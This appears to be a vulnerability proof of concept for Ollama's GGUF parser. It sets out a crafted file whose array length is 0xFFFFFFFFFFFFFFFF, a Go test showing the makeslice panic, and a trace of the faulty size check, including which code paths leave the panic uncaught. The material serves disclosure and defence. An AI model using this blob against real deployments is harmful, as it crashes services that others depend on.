Environment: Darwin arm64, Go unit-test harness against package github.com/ollama/ollama/fs/ggml
Commit: main @ 57653b8e (HEAD at review time)

=== Crafted GGUF blob ===
magic:          "GGUF"
version:        3
num_tensors:    0
num_kv:         1
kv[0].key:      "bad" (uint64 length prefix)
kv[0].type:     ggufTypeArray (9)
kv[0].subtype:  ggufTypeUint8 (0)
kv[0].length:   0xFFFFFFFFFFFFFFFF  <-- attacker-controlled

=== Test output ===
$ go test ./fs/ggml/ -run TestGGUFLengthTruncationPanic -v
=== RUN   TestGGUFLengthTruncationPanic
bits = 64
GOARCH = arm64
PANIC RECOVERED: runtime error: makeslice: len out of range
    gguf_poc_test.go:54: confirmed: panic reached via decode, message=runtime error: makeslice: len out of range
--- PASS: TestGGUFLengthTruncationPanic (0.00s)
PASS
ok   github.com/ollama/ollama/fs/ggml   0.690s

=== Analysis ===
fs/ggml/gguf.go:430  n, _ := readGGUF[uint64]        -> n = 0xFFFFFFFFFFFFFFFF
fs/ggml/gguf.go:437  newArray[uint8](int(n), -1)     -> size = -1 (two's complement wrap on 64-bit int)
fs/ggml/gguf.go:418  if maxSize < 0 ...              -> maxSize = -1 (from ggml.Decode(rs, -1) callers)
                                                        gate passes unconditionally
fs/ggml/gguf.go:419  a.values = make([]uint8, -1)    -> runtime.makeslice panic

Panic recovered by gin.Recovery on HTTP paths (gin.Default() at server/routes.go:1674).
Panic propagates uncaught in runner subprocess paths (ml/backend/ggml/ggml.go:130 fsggml.Decode(r,-1)).
